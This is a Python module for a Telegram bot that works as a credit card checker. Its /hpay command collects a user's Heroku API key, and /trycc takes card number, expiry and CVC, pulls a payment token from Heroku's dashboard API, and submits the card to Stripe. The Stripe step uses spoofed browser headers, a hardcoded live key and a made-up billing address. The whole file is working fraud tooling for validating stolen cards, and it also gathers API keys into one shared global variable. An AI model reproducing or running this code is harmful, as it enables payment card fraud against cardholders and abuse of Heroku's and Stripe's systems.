from pyrogram import Client, filters
import requests
import re
from EQUROBOT import app

# Global variable to store Heroku API key
heroku_api_key = None

# Command to ask for the Heroku API key
@app.on_message(filters.command("hpay"))
def ask_heroku_key(client, message):
    global heroku_api_key
    heroku_api_key = None
    message.reply_text("ENTER YOUR HEROKU API KEY")

# Message handler to receive the Heroku API key
@app.on_message(filters.group & filters.text & ~filters.command("trycc"))
def receive_heroku_key(client, message):
    global heroku_api_key
    if not heroku_api_key:
        heroku_api_key = message.text.strip()
        message.reply_text(f"LOGIN SUCCESSFULLY ✅\nE-MAIL - {heroku_api_key[:5]}... HEROKU MAIL SUCCESSFULLY LOGIN\n\nSEND YOUR CC")

# Command to process credit card details
@app.on_message(filters.command("trycc"))
def process_card(client, message):
    if not heroku_api_key:
        message.reply_text("Please enter your Heroku API key first using /hpay.")
        return
    
    try:
        # Extract the CC details from the message
        card_details = message.text.split()[1]
        parts = re.split('[:|]', card_details)
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]

        url = "https://api.heroku.com/account/payment-method/client-token"

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            'Accept': "application/vnd.heroku+json; version=3",
            'sec-ch-ua': "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Mises\";v=\"120\"",
            'x-origin': "https://dashboard.heroku.com",
            'x-heroku-requester': "dashboard",
            'sec-ch-ua-mobile': "?1",
            'authorization': f"Bearer {heroku_api_key}",
            'sec-ch-ua-platform': "\"Android\"",
            'origin': "https://dashboard.heroku.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://dashboard.heroku.com/",
            'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        response = requests.post(url, headers=headers)

        token = response.json().get('token', '')
        if not token:
            message.reply_text("Error retrieving token from Heroku API.")
            return

        pi = re.search(r'(pi_[^_]+)', token).group(1)

        url = "https://api.stripe.com/v1/payment_methods"

        payload = f"type=card&billing_details%5Bname%5D=Slayer+Noob&billing_details%5Baddress%5D%5Bcity%5D=New+York&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=20+Avenue+A&billing_details%5Baddress%5D%5Bpostal_code%5D=10009&billing_details%5Baddress%5D%5Bstate%5D=NY&card%5Bnumber%5D={n}&card%5Bcvc%5D={cvc}&card%5Bexp_month%5D={mm}&card%5Bexp_year%5D={yy}&key=pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn"

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Content-Type': "application/x-www-form-urlencoded",
            'sec-ch-ua': "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Mises\";v=\"120\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'origin': "https://js.stripe.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://js.stripe.com/",
            'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        response = requests.post(url, data=payload, headers=headers)

        id = response.json().get('id', '')
        if not id:
            message.reply_text("Error retrieving payment method ID from Stripe API.")
            return

        url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"

        payload = f"payment_method={id}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn&client_secret={token}"

        response = requests.post(url, data=payload, headers=headers)

        # Send the result to the user
        message.reply_text(response.text)

    except Exception as e:
        message.reply_text(f"An error occurred: {str(e)}")   
